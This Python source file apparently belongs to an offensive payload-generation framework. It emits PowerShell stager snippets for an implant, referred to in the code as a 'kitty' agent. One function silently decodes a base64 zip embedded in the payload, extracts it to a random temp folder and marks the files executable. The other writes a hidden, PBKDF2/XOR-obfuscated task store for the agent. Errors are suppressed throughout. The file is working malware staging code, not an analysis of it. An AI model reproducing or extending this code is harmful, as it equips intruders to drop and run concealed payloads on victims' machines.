#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""PowerShell code emitters for prestage modules."""

from __future__ import annotations

from typing import Any, Dict

from core.payload_generation.prestage.agent_store_context import resolve_agent_store_context
from core.payload_generation.prestage.zip_context import resolve_zip_prestage_context


def emit_extract_zip(module=None, context: Dict[str, Any] = None) -> str:
    ctx = resolve_zip_prestage_context(module, context)
    zip_b64 = str(ctx.get("zip_b64") or "").strip()
    if not zip_b64:
        return "# extract_zip: set prestage_archive on payload"

    extract_to = str(ctx.get("extract_to") or "").strip()
    cleanup = bool(ctx.get("cleanup_zip"))
    chmod_exec = bool(ctx.get("chmod_exec"))

    return f"""
$ErrorActionPreference='SilentlyContinue'
Add-Type -AssemblyName System.IO.Compression.FileSystem
$_zipB64='{zip_b64}'
$_extractRoot={extract_to!r}
$_cleanup=${str(cleanup).lower()}
$_chmodExec=${str(chmod_exec).lower()}
try {{
  $raw=[Convert]::FromBase64String($_zipB64)
  if(-not $_extractRoot){{
    $_extractRoot=[IO.Path]::Combine([IO.Path]::GetTempPath(), 'ks_'+[Guid]::NewGuid().ToString('N').Substring(0,8))
  }}
  [IO.Directory]::CreateDirectory($_extractRoot)|Out-Null
  $ms=New-Object IO.MemoryStream(,$raw)
  $zip=New-Object IO.Compression.ZipArchive($ms,[IO.Compression.ZipArchiveMode]::Read)
  foreach($entry in $zip.Entries){{
    $dest=[IO.Path]::Combine($_extractRoot,$entry.FullName)
    if($entry.FullName.EndsWith('/')){{
      [IO.Directory]::CreateDirectory($dest)|Out-Null
      continue
    }}
    $parent=[IO.Path]::GetDirectoryName($dest)
    if($parent){{ [IO.Directory]::CreateDirectory($parent)|Out-Null }}
    $fs=[IO.File]::Open($dest,[IO.FileMode]::Create,[IO.FileAccess]::Write)
    $es=$entry.Open()
    try {{ $es.CopyTo($fs) }} finally {{ $fs.Close(); $es.Close() }}
  }}
  $zip.Dispose(); $ms.Dispose()
  if($_chmodExec -and ($PSVersionTable.PSVersion.Major -ge 6) -and ($PSVersionTable.Platform -eq 'Unix')){{
    Get-ChildItem -Path $_extractRoot -Recurse -File | ForEach-Object {{
      try {{ & chmod u+rwx $_.FullName 2>$null }} catch {{}}
    }}
  }}
  $global:_kitty_extract_dir=$_extractRoot
}} catch {{
  if($_cleanup -and $_extractRoot -and (Test-Path $_extractRoot)){{
    try {{ Remove-Item -Recurse -Force $_extractRoot }} catch {{}}
  }}
}}
""".strip()


def emit_agent_store(module=None, context: Dict[str, Any] = None) -> str:
    cfg = resolve_agent_store_context(module, context)
    store_path = cfg["store_path"]
    secret = cfg["store_secret"].replace("'", "''")

    if store_path:
        path_expr = f"'{store_path.replace(chr(39), chr(39)+chr(39))}'"
    else:
        path_expr = "[IO.Path]::Combine([IO.Path]::GetTempPath(), '.kitty_store')"

    return f"""
$ErrorActionPreference='SilentlyContinue'
function _KittyDeriveKey([string]$Secret,[byte[]]$Salt){{
  $pbkdf2=New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Secret,$Salt,120000)
  return $pbkdf2.GetBytes(32)
}}
function _KittyXor([byte[]]$Data,[byte[]]$Key){{
  for($i=0;$i -lt $Data.Length;$i++){{ $Data[$i]=$Data[$i] -bxor $Key[$i % $Key.Length] }}
  return $Data
}}
function _KittyStoreSave([string]$Path,[string]$Secret,[string]$Json){{
  $salt=New-Object byte[] 16
  (New-Object Security.Cryptography.RNGCryptoServiceProvider).GetBytes($salt)|Out-Null
  $key=_KittyDeriveKey $Secret $salt
  $plain=[Text.Encoding]::UTF8.GetBytes($Json)
  $payload=_KittyXor $plain $key
  $blob=New-Object byte[] ($salt.Length + $payload.Length)
  [Array]::Copy($salt,0,$blob,0,$salt.Length)
  [Array]::Copy($payload,0,$blob,$salt.Length,$payload.Length)
  $dir=[IO.Path]::GetDirectoryName($Path)
  if($dir){{ [IO.Directory]::CreateDirectory($dir)|Out-Null }}
  $tmp=$Path+'.tmp'
  [IO.File]::WriteAllBytes($tmp,$blob)
  if(Test-Path $Path){{ Remove-Item -Force $Path }}
  Move-Item -Force $tmp $Path
}}
$global:_kitty_store=@{{ Path={path_expr}; Secret='{secret}'; Cache=@{{ version=1; tasks=@{{}} }} }}
if(-not (Test-Path $global:_kitty_store.Path)){{
  _KittyStoreSave $global:_kitty_store.Path $global:_kitty_store.Secret '{{"version":1,"tasks":{{}}}}'
}}
""".strip()
